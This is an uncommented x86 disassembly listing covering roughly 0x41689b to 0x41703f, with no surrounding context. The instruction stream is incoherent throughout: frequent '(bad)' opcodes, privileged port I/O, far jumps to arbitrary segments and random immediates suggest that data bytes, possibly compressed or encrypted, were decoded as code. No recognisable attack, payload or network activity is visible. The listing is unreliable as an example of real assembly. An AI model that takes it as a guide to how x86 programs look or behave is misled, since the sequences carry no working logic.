  41689b:	adc    ebx,DWORD PTR [edx+0x31]
  41689e:	mov    cl,0x7d
  4168a0:	push   ebp
  4168a1:	mov    ecx,0x14413a96
  4168a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168a7:	jo     0x4168e3
  4168a9:	pop    ss
  4168aa:	out    dx,eax
  4168ab:	outs   dx,BYTE PTR ds:[esi]
  4168ac:	pusha  
  4168ad:	jnp    0x41684c
  4168af:	jae    0x416865
  4168b1:	es add al,0xcb
  4168b4:	fwait
  4168b5:	or     eax,0x21003c72
  4168ba:	scas   al,BYTE PTR es:[edi]
  4168bb:	adc    esi,DWORD PTR [eax+edx*4+0x50]
  4168bf:	dec    ebx
  4168c0:	adc    ebx,ebp
  4168c2:	mov    BYTE PTR [ecx],bh
  4168c4:	jmp    0x971a:0x8b063cdc
  4168cb:	pop    esp
  4168cc:	inc    ecx
  4168cd:	mov    edi,0x62fc6a53
  4168d2:	or     cl,BYTE PTR [eax-0x4f]
  4168d5:	sbb    al,0x20
  4168d7:	stc    
  4168d8:	test   al,0x26
  4168da:	adc    al,0x72
  4168dc:	jle    0x416922
  4168de:	stos   BYTE PTR es:[edi],al
  4168df:	jle    0x41686e
  4168e1:	scas   eax,DWORD PTR es:[edi]
  4168e2:	push   ss
  4168e3:	sbb    eax,0xed0a7feb
  4168e8:	mov    dh,0x9d
  4168ea:	adc    BYTE PTR [edx+0x785c35b2],dl
  4168f0:	bound  ebp,QWORD PTR [esi-0x1e]
  4168f3:	push   eax
  4168f4:	or     ecx,DWORD PTR [ecx+0x53ca9dc]
  4168fa:	or     BYTE PTR [edx+0x43],ch
  4168fd:	add    DWORD PTR [esp+eiz*8+0x78ea41a3],0x5f
  416905:	or     ch,BYTE PTR [edi]
  416907:	sbb    bl,BYTE PTR [edx-0x735dac8f]
  41690d:	fidiv  DWORD PTR [ebx-0xa]
  416910:	retf   
  416911:	cmp    DWORD PTR [eax+0x5a20eef1],0x6b980a34
  41691b:	inc    esi
  41691c:	test   DWORD PTR [eax+edx*1+0x13],0x96175806
  416924:	sbb    BYTE PTR [ecx-0x346901de],0x51
  41692b:	out    0x63,al
  41692d:	daa    
  41692e:	(bad)  
  41692f:	ins    BYTE PTR es:[edi],dx
  416930:	outs   dx,DWORD PTR ds:[esi]
  416931:	jne    0x4168e5
  416933:	out    0x17,eax
  416935:	sub    ebp,DWORD PTR [ebp-0x6739df75]
  41693b:	cs ins DWORD PTR es:[edi],dx
  41693d:	dec    ecx
  41693e:	int3   
  41693f:	pop    esp
  416940:	push   edi
  416941:	cmp    eax,0x696e2dba
  416946:	push   esi
  416948:	adc    edi,edi
  41694a:	iret   
  41694b:	sub    DWORD PTR [ebx-0x365816f3],ebp
  416951:	imul   BYTE PTR [ebx]
  416953:	jns    0x416976
  416955:	jnp    0x4168ff
  416957:	pop    edi
  416958:	int    0x1d
  41695a:	pop    eax
  41695b:	or     esi,DWORD PTR [ebx-0x77e672b]
  416961:	jne    0x4169a3
  416963:	inc    eax
  416964:	aam    0xf9
  416966:	mov    esp,0xf899026e
  41696b:	cmp    eax,0x15092eba
  416970:	pop    ebp
  416971:	fcmovne st,st(7)
  416973:	inc    edi
  416974:	inc    edx
  416975:	gs pop ebx
  416977:	imul   eax,DWORD PTR [esi-0x7f109cd4],0x1f7d88bb
  416981:	and    eax,0x58961eff
  416986:	push   0x277f5cf3
  41698b:	ins    DWORD PTR es:[edi],dx
  41698c:	pop    ss
  41698d:	pop    ebx
  41698e:	add    BYTE PTR [edx],ah
  416990:	cmp    DWORD PTR [ecx*1-0x5ae5045e],ebp
  416997:	mov    ds:0x116397f,al
  41699c:	ja     0x416a08
  41699e:	ficomp DWORD PTR [ebx-0x15]
  4169a1:	(bad)  [eax]
  4169a3:	int    0x89
  4169a5:	adc    dh,ch
  4169a7:	shl    DWORD PTR [ecx-0x3cf18869],cl
  4169ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ae:	xchg   esp,eax
  4169af:	loop   0x416a16
  4169b1:	test   al,0x4b
  4169b3:	xor    ah,bl
  4169b5:	add    bh,BYTE PTR [edx+0x2eeb1135]
  4169bb:	outs   dx,BYTE PTR ds:[esi]
  4169bc:	hlt    
  4169bd:	and    al,0x94
  4169bf:	mov    al,ds:0x4456c532
  4169c4:	outs   dx,BYTE PTR ds:[esi]
  4169c5:	stc    
  4169c6:	call   0xbb68587e
  4169cb:	jne    0x416a38
  4169cd:	push   esi
  4169ce:	push   ecx
  4169cf:	and    BYTE PTR [edi],ah
  4169d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169d2:	xlat   BYTE PTR ds:[ebx]
  4169d4:	iret   
  4169d5:	mov    esp,DWORD PTR [edx+0x7496da1f]
  4169db:	dec    esi
  4169dc:	ret    
  4169dd:	dec    esp
  4169de:	call   0xb0ce:0x6c0871c4
  4169e5:	ja     0x416a3d
  4169e7:	int3   
  4169e8:	xor    al,0xc
  4169ea:	ss pop ebp
  4169ec:	xor    edx,ecx
  4169ee:	xchg   ebp,eax
  4169ef:	jmp    0x20770f63
  4169f4:	push   edx
  4169f5:	dec    edi
  4169f6:	jns    0x416a3a
  4169f8:	ret    
  4169f9:	retf   0x2eec
  4169fc:	jp     0x4169a9
  4169fe:	or     DWORD PTR [esi+0x7a058ac9],ebp
  416a04:	pop    ss
  416a05:	xchg   edx,eax
  416a06:	pop    ebp
  416a07:	aaa    
  416a08:	int    0xa1
  416a0a:	add    DWORD PTR [esi-0x49],esp
  416a0d:	(bad)  
  416a0e:	ja     0x416a5f
  416a10:	ins    BYTE PTR es:[edi],dx
  416a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a12:	imul   esi,DWORD PTR [ecx],0x16217b70
  416a18:	add    cl,BYTE PTR [ebp-0xc]
  416a1b:	push   DWORD PTR [eax]
  416a1d:	out    dx,al
  416a1e:	inc    eax
  416a1f:	xchg   ecx,eax
  416a20:	cmp    dl,bh
  416a22:	mov    ds:0x198749ed,al
  416a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a28:	dec    esp
  416a29:	test   BYTE PTR [edx],ch
  416a2b:	pop    ebp
  416a2c:	push   0xde7a73ad
  416a31:	loop   0x4169b7
  416a33:	repz mov edx,0x1669e874
  416a39:	jp     0x416a96
  416a3b:	pop    eax
  416a3c:	mov    al,BYTE PTR [esi-0x6a66f66d]
  416a42:	data16 mov bh,0x5e
  416a45:	sub    DWORD PTR [eax+0x297a1a9d],ecx
  416a4b:	sub    al,0x53
  416a4d:	sahf   
  416a4e:	rcr    BYTE PTR [esi],1
  416a50:	ret    0xa0f3
  416a53:	scas   al,BYTE PTR es:[edi]
  416a54:	scas   al,BYTE PTR es:[edi]
  416a55:	cmp    esi,0x6fc00d94
  416a5b:	jne    0x416a84
  416a5d:	add    ebp,DWORD PTR [edi+0x57]
  416a60:	jns    0x416a69
  416a62:	and    ebp,eax
  416a64:	pop    ss
  416a65:	mov    ds:0x1a61ecd0,eax
  416a6a:	stc    
  416a6b:	jbe    0x416aa8
  416a6d:	cld    
  416a6e:	xchg   BYTE PTR [esp+eax*2],cl
  416a71:	mov    edx,0xea1b56df
  416a76:	lds    edx,FWORD PTR [edi+esi*1]
  416a79:	fmul   QWORD PTR [ebp+edi*2-0x25]
  416a7d:	push   ecx
  416a7e:	(bad)  
  416a7f:	in     eax,0x2b
  416a81:	dec    esi
  416a82:	ret    0x8934
  416a85:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  416a87:	pop    edx
  416a88:	jnp    0x416a71
  416a8a:	in     eax,0x50
  416a8c:	xchg   esi,eax
  416a8d:	mov    DWORD PTR [ebx],0xdebaf0a2
  416a93:	dec    edi
  416a94:	fldenv [ebp-0x2a]
  416a97:	push   ebx
  416a98:	mov    edi,0x5581dfdc
  416a9d:	retf   0xcad3
  416aa0:	sbb    edi,DWORD PTR [ecx]
  416aa2:	mov    edi,DWORD PTR [edi+0x7a]
  416aa5:	fmul   QWORD PTR [eax+0xf37d82a]
  416aab:	cmp    edi,esi
  416aad:	mov    cl,0x5
  416aaf:	jns    0x416ae3
  416ab1:	xlat   BYTE PTR ds:[ebx]
  416ab2:	jle    0x416b03
  416ab4:	fild   DWORD PTR [ecx-0x64]
  416ab7:	dec    edx
  416ab8:	mov    ds:0x6485683f,eax
  416abd:	shr    DWORD PTR [ecx+0x388455c8],cl
  416ac3:	fstp   QWORD PTR [ebx+ebp*1+0x52]
  416ac7:	ds and eax,0x6f755818
  416acd:	xor    cl,BYTE PTR [ebx-0x6d]
  416ad0:	sbb    esi,DWORD PTR [ebx-0x2a03e730]
  416ad6:	fucom  st(4)
  416ad8:	xor    BYTE PTR [ebx],bh
  416ada:	jb     0x416a98
  416adc:	outs   dx,DWORD PTR ds:[esi]
  416add:	sbb    dl,al
  416adf:	loopne 0x416b47
  416ae1:	mov    ah,0x5
  416ae3:	dec    edi
  416ae4:	div    BYTE PTR [eax]
  416ae6:	add    edi,ecx
  416ae8:	cmp    al,0xaa
  416aea:	dec    edx
  416aeb:	jecxz  0x416a96
  416aed:	adc    al,0xc4
  416aef:	stos   DWORD PTR es:[edi],eax
  416af0:	jp     0x416b03
  416af2:	loop   0x416b35
  416af4:	aam    0xb
  416af6:	or     dh,BYTE PTR [ecx+0x5f]
  416af9:	pop    es
  416afa:	das    
  416afb:	xor    al,cl
  416afd:	test   BYTE PTR [eax-0x77170b93],ah
  416b03:	sub    dh,BYTE PTR [ecx+0x71fbdba6]
  416b09:	xchg   ecx,eax
  416b0a:	push   ebx
  416b0b:	inc    eax
  416b0c:	nop
  416b0d:	ret    
  416b0e:	jg     0x416ace
  416b10:	call   0x5e1d:0x8b547994
  416b17:	xor    eax,0xf36e35bf
  416b1c:	in     al,0xd
  416b1e:	aas    
  416b1f:	loopne 0x416aac
  416b21:	mov    BYTE PTR [ecx+ecx*2-0x67],ch
  416b25:	(bad)  
  416b26:	pop    ecx
  416b27:	sahf   
  416b28:	mov    ecx,0x1a948393
  416b2d:	add    ah,BYTE PTR [eax+0x34f14d9e]
  416b33:	or     ebx,DWORD PTR [edx+0x35858cb0]
  416b39:	shr    BYTE PTR [ecx+ebx*4+0x417b902c],0x8a
  416b41:	outs   dx,BYTE PTR ds:[esi]
  416b42:	push   es
  416b43:	scas   al,BYTE PTR es:[edi]
  416b44:	or     al,0x1f
  416b46:	or     BYTE PTR [esi-0x6f650bce],dl
  416b4c:	pop    cx
  416b4e:	shl    BYTE PTR [ebp-0x4032cfe5],1
  416b54:	adc    DWORD PTR [esi+0x4c],edi
  416b57:	mov    bl,0xda
  416b59:	pushf  
  416b5a:	mov    eax,0x89a288aa
  416b5f:	das    
  416b60:	xor    al,0xd6
  416b62:	adc    bh,BYTE PTR [ebx-0x2ffd4dc0]
  416b68:	test   al,0xc1
  416b6a:	inc    ebx
  416b6b:	and    al,0x45
  416b6d:	or     esi,ebp
  416b6f:	xchg   bp,ax
  416b71:	mov    DWORD PTR [eax+0x77],ebx
  416b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b76:	push   es
  416b77:	leave  
  416b78:	adc    al,0x99
  416b7a:	stc    
  416b7b:	pop    esp
  416b7c:	jmp    0xa7f3:0x4a56d1ab
  416b83:	add    DWORD PTR [ebp+0x50],edi
  416b86:	push   ss
  416b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b88:	test   BYTE PTR [ecx+0x39],dl
  416b8b:	push   ss
  416b8c:	or     DWORD PTR [eax+0x3556dc94],0x4
  416b93:	jmp    0x416b7e
  416b95:	mov    edi,0x70d434fb
  416b9a:	idiv   DWORD PTR [esi+0x12]
  416b9d:	jg     0x416b58
  416b9f:	xlat   BYTE PTR ds:[ebx]
  416ba0:	push   esp
  416ba1:	bound  esp,QWORD PTR [edx-0x6e]
  416ba4:	test   eax,0xd8cfb9ad
  416ba9:	xchg   edi,eax
  416baa:	and    BYTE PTR [esi],bh
  416bac:	pop    ebx
  416bad:	aam    0x86
  416baf:	pop    es
  416bb0:	icebp  
  416bb1:	mov    eax,0x712f0825
  416bb6:	xchg   ecx,eax
  416bb7:	jl     0x416c33
  416bb9:	fstp   DWORD PTR es:[edi]
  416bbc:	cld    
  416bbd:	and    eax,0x4512e940
  416bc2:	imul   edi,esp,0xec7cf273
  416bc8:	dec    edi
  416bc9:	mov    esi,0x13dc9b27
  416bce:	les    edi,FWORD PTR [ecx]
  416bd0:	inc    ecx
  416bd1:	mov    bh,0x44
  416bd3:	pop    edx
  416bd4:	aad    0x26
  416bd6:	push   bp
  416bd8:	test   al,0xcf
  416bda:	adc    BYTE PTR [ebx],0xb2
  416bdd:	mov    BYTE PTR [ecx+esi*1],dh
  416be0:	jmp    0xc500d01
  416be5:	add    eax,0x63226b6b
  416bea:	int3   
  416beb:	iret   
  416bec:	lahf   
  416bed:	mov    DWORD PTR [esi],eax
  416bef:	sub    DWORD PTR [eax+0x1f8abd9c],esi
  416bf5:	test   DWORD PTR [ebx],0xb0a1456d
  416bfb:	daa    
  416bfc:	ins    BYTE PTR es:[edi],dx
  416bfd:	imul   ebp,ebp,0xffffffe6
  416c00:	mov    esi,esi
  416c02:	(bad)  
  416c03:	fwait
  416c04:	outs   dx,BYTE PTR ds:[esi]
  416c05:	pop    ecx
  416c06:	inc    ecx
  416c07:	cmc    
  416c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c09:	or     ch,BYTE PTR [eax-0x3538a0c2]
  416c0f:	adc    cl,BYTE PTR [ecx+0x34]
  416c12:	sub    ah,BYTE PTR [edx]
  416c14:	mov    eax,ds:0x8436fa6b
  416c19:	mov    ds:0x4d0fa0f0,eax
  416c1e:	jne    0x416c58
  416c20:	nop
  416c21:	xchg   ebx,eax
  416c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c23:	inc    edi
  416c24:	out    0xea,al
  416c26:	outs   dx,BYTE PTR ds:[esi]
  416c27:	popa   
  416c28:	mov    dh,0x8c
  416c2a:	inc    ecx
  416c2b:	js     0x416c47
  416c2d:	dec    edi
  416c2e:	add    DWORD PTR [edi],esp
  416c30:	loop   0x416bd1
  416c32:	cmp    eax,0x5cc31f2f
  416c37:	(bad)  
  416c38:	lea    esp,[ecx-0x115fddc5]
  416c3e:	and    eax,0xad5f84a
  416c43:	pop    ds
  416c44:	ins    DWORD PTR es:[edi],dx
  416c45:	pop    eax
  416c46:	(bad)  
  416c48:	adc    eax,0x1d9a32af
  416c4e:	jmp    FWORD PTR [ecx-0x5673ad5d]
  416c54:	xor    al,0xa1
  416c56:	imul   esp,DWORD PTR [edi],0xffffffcc
  416c59:	lods   al,BYTE PTR ds:[esi]
  416c5a:	inc    esi
  416c5b:	cmc    
  416c5c:	or     BYTE PTR [edx+0x1e],dh
  416c5f:	sbb    ah,BYTE PTR [ebp-0x45]
  416c62:	cmp    dh,BYTE PTR [ebx+0x5]
  416c65:	enter  0x3e9d,0x2d
  416c69:	in     eax,dx
  416c6a:	push   ecx
  416c6b:	out    dx,al
  416c6c:	ds daa 
  416c6e:	loopne 0x416bfc
  416c70:	mov    BYTE PTR [edx+0x45],dh
  416c73:	or     eax,0x2aa2ae3e
  416c78:	xor    DWORD PTR [ecx-0x78],edi
  416c7b:	inc    esp
  416c7c:	imul   esp,DWORD PTR [eax-0x18],0x8dd04728
  416c83:	add    ch,BYTE PTR [edx+0xb]
  416c86:	lods   al,BYTE PTR es:[esi]
  416c88:	push   0xab057e76
  416c8d:	stos   BYTE PTR es:[edi],al
  416c8e:	fs sbb eax,0x3e394e0f
  416c94:	in     eax,0x22
  416c96:	es enter 0x8aea,0xe7
  416c9b:	pushf  
  416c9c:	push   esp
  416c9d:	pop    DWORD PTR [edx+esi*8+0x1dfe27a3]
  416ca4:	inc    edi
  416ca5:	je     0x416cc2
  416ca7:	(bad)  
  416ca8:	lock icebp 
  416caa:	stc    
  416cab:	jbe    0x416d10
  416cad:	pop    es
  416cae:	mov    ds:0x20d050de,al
  416cb3:	mov    esi,0xda61a6a1
  416cb8:	popa   
  416cb9:	dec    ebx
  416cba:	stos   DWORD PTR es:[edi],eax
  416cbb:	test   BYTE PTR [ebx-0x76],al
  416cbe:	add    ch,BYTE PTR [edi+0x662a34ae]
  416cc4:	and    BYTE PTR [esi+0x72d0d789],al
  416cca:	fs in  al,0xad
  416ccd:	mov    esp,0x7bd56b90
  416cd2:	scas   eax,DWORD PTR es:[edi]
  416cd3:	mov    eax,ds:0x6da432f1
  416cd8:	jg     0x416cf9
  416cda:	add    BYTE PTR [ebx+0xfd0e0ef],0xf6
  416ce1:	(bad)  [ebx]
  416ce3:	jae    0x416d20
  416ce5:	xchg   edx,eax
  416ce6:	sbb    al,0x5
  416ce8:	inc    ecx
  416ce9:	add    DWORD PTR [edi],eax
  416ceb:	cdq    
  416cec:	jmp    FWORD PTR [ebp+0x6c8b55ed]
  416cf2:	adc    eax,0xfd56f93f
  416cf7:	int3   
  416cf8:	sbb    al,0x8b
  416cfa:	fdiv   QWORD PTR [edi+0xc]
  416cfd:	inc    edx
  416cfe:	es stc 
  416d00:	(bad)  
  416d01:	out    dx,al
  416d02:	call   esi
  416d04:	push   eax
  416d05:	or     al,0xbf
  416d07:	and    al,0xa0
  416d09:	jmp    0x416cd8
  416d0b:	loop   0x416d4c
  416d0d:	cmp    eax,DWORD PTR [ebp+0x4e]
  416d10:	jmp    0x9311bbb1
  416d15:	enter  0xeb9a,0x21
  416d19:	in     al,0x80
  416d1b:	jp     0x416d1f
  416d1d:	sub    ebp,edx
  416d1f:	clc    
  416d20:	mov    al,ds:0x310f5a6e
  416d25:	jno    0x416d44
  416d27:	das    
  416d28:	cmp    al,0x9c
  416d2a:	fwait
  416d2b:	adc    DWORD PTR [edx+0x19b4daa6],0x63fc035d
  416d35:	mov    esi,0xa18c2600
  416d3a:	push   ebx
  416d3b:	fld    DWORD PTR [ecx+0x50a359af]
  416d41:	and    edx,DWORD PTR [eax]
  416d43:	xchg   edx,eax
  416d44:	mov    dl,0xb5
  416d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d47:	in     al,dx
  416d48:	out    dx,eax
  416d49:	in     eax,dx
  416d4a:	jecxz  0x416daf
  416d4c:	mov    bl,0x87
  416d4e:	push   0xffffffd3
  416d50:	fdivr  DWORD PTR [eax+0x70c83e76]
  416d56:	xchg   DWORD PTR ds:0xe964a95d,ecx
  416d5c:	(bad)  
  416d5e:	jnp    0x416d6d
  416d60:	sub    BYTE PTR [eax+0x76],cl
  416d63:	and    dh,BYTE PTR [eax+0x2c]
  416d66:	mov    cl,0x14
  416d68:	sbb    dh,0x58
  416d6b:	out    dx,eax
  416d6c:	and    DWORD PTR [edi],edi
  416d6e:	enter  0x22e8,0x2
  416d72:	pop    es
  416d73:	mov    bh,0x56
  416d75:	test   al,0x32
  416d77:	xor    eax,0x49c6b16a
  416d7c:	rcr    ah,0x91
  416d7f:	cld    
  416d80:	push   0xffffffee
  416d82:	aad    0x1e
  416d84:	inc    edi
  416d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d86:	mov    dl,0x2c
  416d88:	test   BYTE PTR [eax],bh
  416d8a:	xor    bh,ah
  416d8c:	adc    al,0xae
  416d8e:	(bad)  
  416d8f:	shl    BYTE PTR [eax+0x1250ca78],1
  416d95:	adc    BYTE PTR [esi],bl
  416d97:	xchg   BYTE PTR [esi-0x40],al
  416d9a:	js     0x416df9
  416d9c:	push   ss
  416d9d:	jne    0x416d4b
  416d9f:	sub    eax,0xa41f0382
  416da4:	mov    ebx,0x25b0173
  416da9:	fadd   QWORD PTR [ecx]
  416dab:	call   0x2c3e:0xcbc71b19
  416db2:	mov    dh,0x88
  416db4:	mov    edi,0x160c5075
  416db9:	fs mov esp,0xfbcfbdaa
  416dbf:	scas   al,BYTE PTR es:[edi]
  416dc0:	pop    ecx
  416dc1:	mov    edx,0xce9bd702
  416dc6:	push   ebx
  416dc7:	fbld   TBYTE PTR [eax-0x74]
  416dca:	sbb    eax,0xd387ea59
  416dcf:	dec    ebx
  416dd0:	outs   dx,BYTE PTR ds:[esi]
  416dd1:	cmp    eax,0x74e57ded
  416dd6:	out    dx,eax
  416dd7:	retf   0xfbd7
  416dda:	icebp  
  416ddb:	pop    ss
  416ddc:	div    DWORD PTR [edi]
  416dde:	inc    ebx
  416ddf:	loopne 0x416da8
  416de1:	mov    edx,0xced3b19e
  416de6:	mov    bl,BYTE PTR [ebx-0x52a60c2e]
  416dec:	in     eax,dx
  416ded:	std    
  416dee:	imul   ebx,DWORD PTR [edx+0x4cec28ec],0xf
  416df5:	mov    al,ds:0xdd526fb0
  416dfa:	add    ch,ah
  416dfc:	in     al,0x22
  416dfe:	mov    DWORD PTR [edi],eax
  416e00:	ret    0x5073
  416e03:	mov    ebx,0x1ad35c11
  416e08:	inc    ebp
  416e09:	je     0x416db2
  416e0b:	mov    eax,ds:0xc78bbb77
  416e10:	xchg   esp,eax
  416e11:	push   0x63
  416e13:	dec    eax
  416e14:	mov    ah,0x7e
  416e16:	jmp    0xbccb:0x791ddcb5
  416e1d:	in     al,0x1b
  416e1f:	push   edi
  416e20:	stos   BYTE PTR es:[edi],al
  416e21:	xchg   edi,eax
  416e22:	repz pusha 
  416e24:	mov    ah,0xda
  416e26:	hlt    
  416e27:	shr    DWORD PTR [ebp+0x3d],1
  416e2a:	cwde   
  416e2b:	inc    eax
  416e2c:	pop    edi
  416e2d:	iret   
  416e2e:	mov    ecx,0xe7e7115a
  416e33:	add    DWORD PTR [eax+0x235cb771],esi
  416e39:	int    0x37
  416e3b:	xchg   DWORD PTR [ebx-0x70],edi
  416e3e:	es sub eax,0xe689a8af
  416e44:	inc    edi
  416e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e46:	ja     0x416e54
  416e48:	repz add al,0xbd
  416e4b:	dec    ecx
  416e4c:	or     ah,BYTE PTR [edx+0x26]
  416e4f:	ja     0x416df7
  416e51:	xchg   esp,eax
  416e52:	ins    DWORD PTR es:[edi],dx
  416e53:	daa    
  416e54:	je     0x416ec3
  416e56:	push   cs
  416e57:	xor    eax,0xf2c3ce05
  416e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e5d:	lods   eax,DWORD PTR ds:[esi]
  416e5e:	lods   al,BYTE PTR ds:[esi]
  416e5f:	mov    dl,BYTE PTR [edi]
  416e61:	cmp    BYTE PTR [edi+eiz*1+0x6e201c4],dl
  416e68:	mov    ?,WORD PTR [edi]
  416e6a:	cld    
  416e6b:	push   ss
  416e6c:	inc    ebx
  416e6d:	sbb    al,0x42
  416e6f:	add    eax,0x365749b2
  416e74:	mov    esi,0x391c9564
  416e79:	mov    es,WORD PTR [edx-0x701401db]
  416e7f:	sahf   
  416e80:	push   ecx
  416e81:	scas   eax,DWORD PTR es:[edi]
  416e82:	mov    eax,0xb2e207ff
  416e87:	pop    esi
  416e88:	xlat   BYTE PTR ds:[ebx]
  416e89:	mov    al,ds:0xd574291f
  416e8e:	icebp  
  416e8f:	or     DWORD PTR [eax+0x5b],edx
  416e92:	cld    
  416e93:	cmp    al,0xf5
  416e95:	jb     0x416e9d
  416e97:	jns    0x416eb3
  416e99:	stos   DWORD PTR es:[edi],eax
  416e9a:	std    
  416e9b:	xor    BYTE PTR [ecx+0x4f86ffe],dl
  416ea1:	aam    0xbc
  416ea3:	adc    al,BYTE PTR [ebx+0x7aa5ae40]
  416ea9:	sub    DWORD PTR [esi],ebp
  416eab:	int    0x2d
  416ead:	xchg   DWORD PTR [eax+0x2a0773d7],eax
  416eb3:	pop    ds
  416eb4:	scas   eax,DWORD PTR es:[edi]
  416eb5:	jno    0x416ee0
  416eb7:	or     eax,0x319a2de3
  416ebc:	pop    eax
  416ebd:	xlat   BYTE PTR ds:[ebx]
  416ebe:	jno    0x416f3e
  416ec0:	adc    al,0x2f
  416ec2:	mov    esi,0x8c5c176f
  416ec7:	jle    0x416ee3
  416ec9:	jbe    0x416f27
  416ecb:	cdq    
  416ecc:	in     al,dx
  416ecd:	mov    bh,0x45
  416ecf:	add    ch,dl
  416ed1:	rol    BYTE PTR [ecx+0x4f3a08a7],1
  416ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ed8:	mov    ah,0xb3
  416eda:	les    eax,FWORD PTR [edi+0x1d1d1d6c]
  416ee0:	out    dx,eax
  416ee1:	mov    esi,0xaa0cf539
  416ee6:	fnsave [edi+0x44]
  416ee9:	loope  0x416ee5
  416eeb:	adc    dh,0x83
  416eee:	stos   DWORD PTR es:[edi],eax
  416eef:	cmp    BYTE PTR [edx],bl
  416ef1:	rol    DWORD PTR [eax-0x4068863e],1
  416ef7:	pop    esi
  416ef8:	cli    
  416ef9:	in     eax,dx
  416efa:	lods   al,BYTE PTR ds:[esi]
  416efb:	push   ecx
  416efc:	imul   esi,DWORD PTR [eax-0x17],0x67
  416f00:	jl     0x416f18
  416f02:	in     al,dx
  416f03:	push   edx
  416f04:	idiv   BYTE PTR [edx]
  416f06:	sar    bl,1
  416f08:	jne    0x416f78
  416f0a:	repz jbe 0x416f35
  416f0d:	in     eax,0x4a
  416f0f:	mov    cl,0x36
  416f11:	scas   al,BYTE PTR es:[edi]
  416f12:	das    
  416f13:	icebp  
  416f14:	popa   
  416f15:	mov    ch,0xbe
  416f17:	jb     0x416f04
  416f19:	xor    DWORD PTR [eax+0x70272e96],edx
  416f1f:	adc    esp,DWORD PTR [eax-0x336a8c42]
  416f25:	xor    BYTE PTR [eax],0xfc
  416f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f29:	js     0x416eae
  416f2b:	stos   BYTE PTR es:[edi],al
  416f2c:	pop    ss
  416f2d:	dec    edi
  416f2e:	clc    
  416f2f:	push   edx
  416f30:	cwde   
  416f31:	mov    es,esi
  416f33:	xchg   ecx,eax
  416f34:	push   0xccff3861
  416f39:	pop    ss
  416f3a:	fs mov ebx,0xb92106ed
  416f40:	mov    ecx,0x71ace47d
  416f45:	jo     0x416fc4
  416f47:	jecxz  0x416f2b
  416f49:	push   0x93e39f46
  416f4e:	loopne 0x416f80
  416f50:	inc    ecx
  416f51:	in     eax,dx
  416f52:	fcomp  QWORD PTR [ebx]
  416f54:	lea    eax,[edi+0x66]
  416f57:	in     eax,0xc
  416f59:	sbb    bh,BYTE PTR [esi+0x6d]
  416f5c:	xchg   BYTE PTR [esi-0x79],dl
  416f5f:	loopne 0x416f08
  416f61:	push   0xfa32e9d0
  416f66:	jne    0x416f3a
  416f68:	dec    ebp
  416f69:	aas    
  416f6a:	stos   DWORD PTR es:[edi],eax
  416f6b:	add    bh,BYTE PTR [edx+0x51]
  416f6e:	mov    esi,0x83c82080
  416f73:	jns    0x416fb0
  416f75:	shl    dh,0xa8
  416f78:	scas   al,BYTE PTR es:[edi]
  416f79:	sub    esp,DWORD PTR [ecx-0x5ce6a085]
  416f7f:	sbb    bh,BYTE PTR [edi]
  416f81:	sbb    BYTE PTR [eax-0xb],al
  416f84:	push   DWORD PTR ds:[ecx+0x3b538d3e]
  416f8b:	scas   al,BYTE PTR es:[edi]
  416f8c:	(bad)  
  416f8d:	push   esp
  416f8e:	add    eax,0x319a1e35
  416f93:	out    dx,al
  416f94:	and    edi,DWORD PTR [ecx+eax*1-0x6abac6fc]
  416f9b:	addr16 es imul ecx,ebx,0x75
  416fa0:	pop    ds
  416fa1:	fbld   TBYTE PTR [ebx-0x5]
  416fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fa5:	stos   BYTE PTR es:[edi],al
  416fa6:	or     bh,ah
  416fa8:	jns    0x416fda
  416faa:	mov    edx,0x86a43bbf
  416faf:	dec    eax
  416fb0:	jns    0x416f90
  416fb2:	repz mov ds:0x388b4e2d,eax
  416fb8:	dec    edx
  416fb9:	mov    bl,BYTE PTR [ebp-0x6bc3186]
  416fbf:	loopne 0x416fbc
  416fc1:	mov    edi,0x27fcfcce
  416fc6:	and    BYTE PTR [ecx],ch
  416fc8:	mov    ds:0x51174c61,al
  416fcd:	or     edx,eax
  416fcf:	push   es
  416fd0:	xor    BYTE PTR [esi+0x3b3ef0c4],0x9d
  416fd7:	push   ebx
  416fd8:	cwde   
  416fd9:	lds    eax,FWORD PTR ds:0x2476cd25
  416fdf:	pop    DWORD PTR [ebx+0x4a9ebf34]
  416fe5:	cmp    BYTE PTR [esi-0x189aa5df],ah
  416feb:	jo     0x417063
  416fed:	shl    esi,cl
  416fef:	inc    ebp
  416ff0:	aaa    
  416ff1:	sbb    esi,DWORD PTR [ecx]
  416ff3:	push   edx
  416ff4:	(bad)  
  416ff5:	imul   ebp,DWORD PTR [edi+0x52],0x69
  416ff9:	push   eax
  416ffa:	test   al,0xe2
  416ffc:	int3   
  416ffd:	push   edx
  416ffe:	hlt    
  416fff:	mov    esi,0x56587932
  417004:	leave  
  417005:	xchg   esp,eax
  417006:	sbb    ecx,ebx
  417008:	sbb    DWORD PTR [esi],esp
  41700a:	mov    ecx,0xc887ef4
  41700f:	push   edx
  417010:	cmp    ebx,eax
  417012:	mov    gs,WORD PTR [esi+ecx*8-0x47aec3e4]
  417019:	nop
  41701a:	adc    ebx,eax
  41701c:	inc    ebx
  41701d:	or     BYTE PTR [eax+ebp*2],bh
  417020:	out    dx,al
  417021:	ror    DWORD PTR [esi+0x4007b095],cl
  417027:	push   0x53986fd6
  41702c:	pop    ebx
  41702d:	mov    dl,0x84
  41702f:	enter  0xe98a,0x65
  417033:	inc    ebx
  417034:	pop    ds
  417035:	movups XMMWORD PTR [eax+0x7f],xmm5
  417039:	mov    dh,BYTE PTR [esi+0x7cf5df31]
  41703f:	push   cs
